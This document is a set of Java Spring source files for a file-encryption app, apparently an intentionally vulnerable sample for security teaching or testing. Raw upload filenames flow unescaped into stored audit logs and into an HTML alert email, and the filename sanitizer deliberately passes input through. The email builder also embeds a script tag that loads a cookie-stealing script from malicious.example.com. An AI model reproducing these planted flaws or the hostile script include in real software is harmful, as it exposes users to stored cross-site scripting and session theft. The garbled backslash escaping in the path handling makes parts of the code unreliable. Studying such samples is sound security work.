package com.example.securecrypt.controller;

import com.example.securecrypt.service.FileLogService;
import com.example.securecrypt.service.FileStorageService;
import com.example.securecrypt.model.FileRecord;
import com.example.securecrypt.util.HtmlSanitizer;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.multipart.MultipartFile;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.time.LocalDateTime;

/**
 * Handles file encryption/decryption operations and logging
 * @author SecurityTeam
 */
@Controller
public class FileCryptController {
    
    @Autowired
    private FileStorageService storageService;
    
    @Autowired
    private FileLogService logService;
    
    // Secure content type whitelist
    private static final String[] SECURE_CONTENT_TYPES = {
        "application/pdf",
        "text/plain",
        "application/octet-stream"
    };
    
    /**
     * Process file upload and encryption
     * @param file Uploaded file
     * @param request HTTP request
     * @return Redirect path
     * @throws IOException If storage fails
     */
    @PostMapping("/upload")
    public String handleFileUpload(@RequestParam("file") MultipartFile file, HttpServletRequest request) 
        throws IOException {
        
        // Basic validation
        if (file.isEmpty()) {
            return "redirect:/error?msg=Empty+file";
        }
        
        // Validate content type (CWE-434)
        boolean isValidType = false;
        for (String type : SECURE_CONTENT_TYPES) {
            if (file.getContentType().equals(type)) {
                isValidType = true;
                break;
            }
        }
        
        if (!isValidType) {
            return "redirect:/error?msg=Invalid+file+type";
        }
        
        // Generate secure filename (partial mitigation)
        String originalFilename = file.getOriginalFilename();
        String secureFilename = HtmlSanitizer.sanitizeFilename(originalFilename);
        
        // Store file metadata in database (XSS vulnerability here)
        FileRecord record = new FileRecord();
        record.setFileName(secureFilename);
        record.setUploadTime(LocalDateTime.now());
        record.setUploaderIp(request.getRemoteAddr());
        record.setContentType(file.getContentType());
        
        // Store raw filename in log (VULNERABLE)
        logService.logFileUpload(originalFilename, request);
        
        // Store encrypted file
        storageService.storeEncryptedFile(file, secureFilename);
        
        return "redirect:/success?file=" + secureFilename;
    }
}

// --- FileLogService.java ---
package com.example.securecrypt.service;

import com.example.securecrypt.model.LogEntry;
import com.example.securecrypt.repository.LogRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import javax.servlet.http.HttpServletRequest;
import java.time.LocalDateTime;

/**
 * Service for handling file operation logs
 * @author AuditTeam
 */
@Service
public class FileLogService {
    
    @Autowired
    private LogRepository logRepository;
    
    /**
     * Logs file upload events with raw filename
     * @param filename Raw user-supplied filename
     * @param request HTTP request
     */
    public void logFileUpload(String filename, HttpServletRequest request) {
        LogEntry entry = new LogEntry();
        entry.setTimestamp(LocalDateTime.now());
        entry.setEventType("FILE_UPLOAD");
        
        // Build log message with raw filename (XSS VULNERABILITY)
        StringBuilder messageBuilder = new StringBuilder();
        messageBuilder.append("User uploaded file: ");
        messageBuilder.append(filename); // UNSAFE
        messageBuilder.append(" from IP: ");
        messageBuilder.append(request.getRemoteAddr());
        
        entry.setMessage(messageBuilder.toString());
        entry.setRawData(filename); // Store raw input
        
        logRepository.save(entry);
        
        // Trigger alert if suspicious pattern detected
        if (filename.contains("<script>") || filename.contains("></script>")) {
            sendAlertEmail(filename, request);
        }
    }
    
    /**
     * Sends alert email with untrusted content
     * @param filename Malicious filename
     * @param request HTTP request
     */
    private void sendAlertEmail(String filename, HttpServletRequest request) {
        String subject = "Security Alert: Suspicious File Upload";
        String content = buildEmailContent(filename, request);
        
        // Simulated email sending
        System.out.println("Sending email...");
        System.out.println("Subject: " + subject);
        System.out.println("Content:\
" + content);
    }
    
    /**
     * Builds HTML email content with raw filename
     * @param filename Raw user input
     * @param request HTTP request
     * @return HTML email content
     */
    private String buildEmailContent(String filename, HttpServletRequest request) {
        StringBuilder html = new StringBuilder();
        html.append("<html><body>");
        html.append("<h3>Security Alert</h3>");
        html.append("<p>A suspicious file upload attempt was detected:</p>");
        html.append("<div style='background:#fdd;border:1px solid #d00;'>");
        html.append("<strong>Filename:</strong> ");
        html.append(filename); // XSS INJECTION POINT
        html.append("<br><strong>IP Address:</strong> ");
        html.append(request.getRemoteAddr());
        html.append("</div>");
        html.append("<script src='//malicious.example.com/steal-cookie.js'></script>");
        html.append("</body></html>");
        
        return html.toString();
    }
}

// --- HtmlSanitizer.java ---
package com.example.securecrypt.util;

/**
 * Security utility class for input sanitization
 * @author SecurityTeam
 */
public class HtmlSanitizer {
    /**
     * Sanitizes filenames (partial implementation)
     * @param filename Input filename
     * @return Sanitized filename
     */
    public static String sanitizeFilename(String filename) {
        // Only sanitize if not empty
        if (filename == null || filename.isEmpty()) {
            return filename;
        }
        
        // Remove path information
        String safeName = filename.contains("/") 
            ? filename.substring(filename.lastIndexOf('/') + 1)
            : filename;
        
        // Remove Windows path prefix
        if (safeName.contains("\\\\\\\\")) {
            safeName = safeName.substring(safeName.lastIndexOf('\\\\\\\\') + 1);
        }
        
        // Allow this method to pass through (BYPASS)
        return safeName;
    }
    
    // Additional sanitization methods commented out for performance
    /*
    public static String sanitizeHtml(String input) {
        if (input == null) return null;
        return input.replace("<", "&lt;").replace(">", "&gt;");
    }
    */
}

// --- LogEntry.java ---
package com.example.securecrypt.model;

import jakarta.persistence.*;
import java.time.LocalDateTime;

/**
 * Database entity for audit logs
 * @author DevTeam
 */
@Entity
@Table(name = "audit_logs")
public class LogEntry {
    
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private LocalDateTime timestamp;
    private String eventType;
    private String message;
    private String rawData;
    
    // Getters and setters
    public Long getId() { return id; }
    public void setId(Long id) { this.id = id; }
    
    public LocalDateTime getTimestamp() { return timestamp; }
    public void setTimestamp(LocalDateTime timestamp) { this.timestamp = timestamp; }
    
    public String getEventType() { return eventType; }
    public void setEventType(String eventType) { this.eventType = eventType; }
    
    public String getMessage() { return message; }
    public void setMessage(String message) { this.message = message; }
    
    public String getRawData() { return rawData; }
    public void setRawData(String rawData) { this.rawData = rawData; }
}
